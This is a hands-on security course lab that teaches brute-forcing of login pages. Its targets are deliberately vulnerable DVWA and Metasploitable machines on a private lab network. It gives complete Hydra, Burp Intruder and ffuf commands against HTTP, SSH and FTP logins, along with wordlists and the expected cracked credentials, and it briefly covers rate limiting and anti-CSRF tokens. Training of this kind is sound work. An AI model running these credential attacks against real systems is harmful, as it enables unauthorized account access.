# 🔬 Lab Exercise 3: Brute Force Login Bypass

> **Challenge:** Brute force login pages to find valid credentials
> **Where:** DVWA on Metasploitable + Kali tools (Hydra, Burp, ffuf)
> **Time:** ~45-55 minutes

---

## Exercise 3A: Brute Force with Hydra — HTTP GET

**Target:** DVWA Brute Force page at `http://192.168.56.20/dvwa/vulnerabilities/brute/`

> **Prerequisite:** DVWA security set to **Low**

```bash
# Step 1: Manually try the page first
# Go to http://192.168.56.20/dvwa/vulnerabilities/brute/
# Try: admin / wrongpass → Note the failure message
# 📝 Failure message: ______________

# Step 2: Get your DVWA session cookie
# In Firefox: F12 → Console → document.cookie
# 📝 Copy PHPSESSID value: ______________

# Step 3: Run Hydra against DVWA brute force page (GET form)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.20 \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie\: PHPSESSID=YOUR_SESSION_ID; security=low"

# ⚠️ Replace YOUR_SESSION_ID with your actual PHPSESSID
# ⚠️ rockyou.txt is huge — use a smaller list first for speed:

# Step 4: Use a shorter wordlist for faster results
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  192.168.56.20 \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie\: PHPSESSID=YOUR_SESSION_ID; security=low"

# ✅ EXPECTED: [80][http-get-form] host: 192.168.56.20   login: admin   password: password
```

---

## Exercise 3B: Brute Force with Hydra — SSH

**Target:** Metasploitable SSH at `192.168.56.20:22`

```bash
# Step 1: Create a small username list
cat > /tmp/users.txt << 'EOF'
root
admin
msfadmin
user
test
postgres
EOF

# Step 2: Create a small password list
cat > /tmp/passes.txt << 'EOF'
password
admin
msfadmin
root
123456
test
postgres
letmein
EOF

# Step 3: Run Hydra against SSH
hydra -L /tmp/users.txt -P /tmp/passes.txt \
  192.168.56.20 ssh -t 4

# ✅ EXPECTED: Multiple valid credentials found:
#   [22][ssh] host: 192.168.56.20   login: msfadmin   password: msfadmin
#   [22][ssh] host: 192.168.56.20   login: postgres   password: postgres
# 📝 List all credentials found: ______________

# Step 4: Verify a found credential
ssh msfadmin@192.168.56.20
# Password: msfadmin
# ✅ EXPECTED: Login successful
exit
```

---

## Exercise 3C: Brute Force with Burp Intruder

**Target:** DVWA Brute Force page

```
Step 1: Set up Burp proxy and intercept
  - Configure Firefox proxy → 127.0.0.1:8080
  - Turn Intercept ON
  - Go to http://192.168.56.20/dvwa/vulnerabilities/brute/
  - Enter: admin / test123 → Click Login
  - In Burp, you'll see the intercepted GET request

Step 2: Send to Intruder
  - Right-click the intercepted request → "Send to Intruder"
  - Turn Intercept OFF

Step 3: Configure Intruder — Sniper mode (single field)
  - Intruder → Positions tab
  - Click "Clear §" to clear all markers
  - Highlight ONLY the password value (test123) → Click "Add §"
  - Attack type: Sniper

Step 4: Set payload
  - Go to Payloads tab
  - Payload type: Simple list
  - Add these passwords:
    admin
    password
    password123
    letmein
    12345
    admin123
    root
    changeme

Step 5: Start Attack
  - Click "Start Attack"
  - Sort results by "Length" column
  ✅ EXPECTED: "password" has a DIFFERENT response length (larger) = successful login!
  📝 Correct password response length: ______________
  📝 Wrong password response length: ______________
```

---

## Exercise 3D: Brute Force with ffuf

**Target:** DVWA Brute Force page

```bash
# Step 1: Get your DVWA session cookie
# F12 → Console → document.cookie

# Step 2: Run ffuf against DVWA brute force page
ffuf -u "http://192.168.56.20/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID; security=low" \
  -fs 4271

# ⚠️ Replace YOUR_SESSION_ID with your actual PHPSESSID
# ⚠️ -fs 4271 filters out responses of that size (wrong password size)
# You may need to adjust the size — run without -fs first to see common sizes

# Step 3: Run without filter first to find response sizes
ffuf -u "http://192.168.56.20/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID; security=low"

# 📝 Note the response sizes — most will be the same (wrong password)
# 📝 One response will have a DIFFERENT size (correct password)
# ✅ EXPECTED: "password" → different response size = correct!
```

---

## Exercise 3E: Brute Force at Medium Security (CSRF Token Handling)

**Target:** DVWA Brute Force at **Medium** security

```
Step 1: Change DVWA security to Medium
  - Go to http://192.168.56.20/dvwa/security.php → set to "Medium"

Step 2: Try brute force again
  - Go to http://192.168.56.20/dvwa/vulnerabilities/brute/
  - Try: admin / wrong → Submit
  📝 Notice: There's a deliberate time delay before the response!
  📝 This is rate limiting — the server sleeps 2 seconds on wrong passwords

Step 3: Observe the impact on brute force speed
  - Run Hydra again with the same command as 3A (change security=medium)
  📝 How much slower is the attack now?
  📝 At 2 seconds per attempt, how long would 10,000 passwords take?
  📝 Calculation: ______________

Step 4: Brute force with Burp (slower but works)
  - Repeat the Burp Intruder steps from 3C
  - Notice each request takes ~2 seconds
  - In Intruder settings: try setting more threads
  ✅ The attack still works, just slower — rate limiting helps but doesn't fully prevent brute force!

Step 5: Try at High security
  - Change to "High" security
  - Intercept a login request in Burp
  - 📝 Do you see a user_token parameter? (Anti-CSRF token)
  - 📝 This makes brute force harder because each request needs a valid token
  - You'd need a macro in Burp to extract the token from each response
```

---

## Exercise 3F: Hydra Against FTP

**Target:** Metasploitable FTP at `192.168.56.20:21`

```bash
# Step 1: Brute force FTP
hydra -L /tmp/users.txt -P /tmp/passes.txt \
  192.168.56.20 ftp -t 4

# ✅ EXPECTED: Valid FTP credentials found
# 📝 Credentials: ______________

# Step 2: Login with found credentials
ftp 192.168.56.20
# Enter the discovered username and password
# 📝 What files/directories can you access?

# Step 3: Try anonymous FTP
ftp 192.168.56.20
# Username: anonymous
# Password: (press Enter)
# 📝 Does anonymous access work?
```

---

## ✅ Completion Checklist

- [ ] Brute forced DVWA login with Hydra HTTP GET form (3A)
- [ ] Brute forced Metasploitable SSH with Hydra (3B)
- [ ] Used Burp Intruder for brute force — analyzed response lengths (3C)
- [ ] Used ffuf for fast web brute force (3D)
- [ ] Observed rate limiting at Medium security and CSRF tokens at High (3E)
- [ ] Brute forced FTP service with Hydra (3F)

---

**Next:** [Challenge 21: File Upload Bypass →](./04_lab_file_upload_bypass.md)
